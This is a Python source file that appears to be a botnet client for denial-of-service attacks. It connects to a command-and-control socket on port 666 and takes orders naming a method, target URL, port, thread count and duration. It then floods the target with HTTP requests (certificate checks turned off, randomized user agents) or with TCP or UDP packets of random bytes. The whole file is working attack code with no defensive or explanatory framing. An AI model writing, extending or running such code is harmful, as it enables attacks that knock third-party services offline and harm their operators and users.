import socket
import threading
import os
import time
import random
from colorama import Fore
from fake_useragent import UserAgent
from ssl import CERT_NONE, SSLContext, create_default_context
from urllib.parse import urlparse
from certifi import where

while True:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect(('localhost',666))
    except:
        time.sleep(1)

    while True:
        try:
            c2 = s.recv(1024).decode()
        except:
            s.close()
            break

    try:
        method = str(c2.split()[0])
        url = str(c2.split()[1])
        port = int(c2.split()[2])
        threads = int(c2.split()[3])
        rpc = int(c2.split()[4])
        timme = int(c2.split()[5])
        timer = time.time() + timme
    except:
        pass

    ua = UserAgent()

    parsed_url = urlparse(url)
    target = parsed_url.netloc
    path = parsed_url.path

    ssl = create_default_context(cafile=where())
    ssl.check_hostname = False
    ssl.verify_mode = CERT_NONE

    def httphead():
        return f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()

    def http():
        while time.time() < timer:
            try:
                if url.split('://')[0] == 'https':
                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s = ssl.wrap_socket(s, server_hostname=target)
                    s.connect((target,port))
                else:
                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.connect((target,port))
                for _ in range(rpc):
                    payl = httphead()
                    s.send(payl)
            except:
                pass

    def tcp():
        while time.time() < timer:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target,port))
                rn = random._urandom(1024)
                s.send(rn)
            except:
                pass

    def udp():
        while time.time() < timer:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((target,port))
                rn = random._urandom(1024)
                s.send(rn)
            except:
                pass

    if method == 'http':
        for _ in range(threads):
            t = threading.Thread(target=http)
            t.start()
    elif method == 'tcp':
        for _ in range(threads):
            t = threading.Thread(target=tcp)
            t.start()
    elif method == 'udp':
        for _ in range(threads):
            t = threading.Thread(target=udp)
            t.start()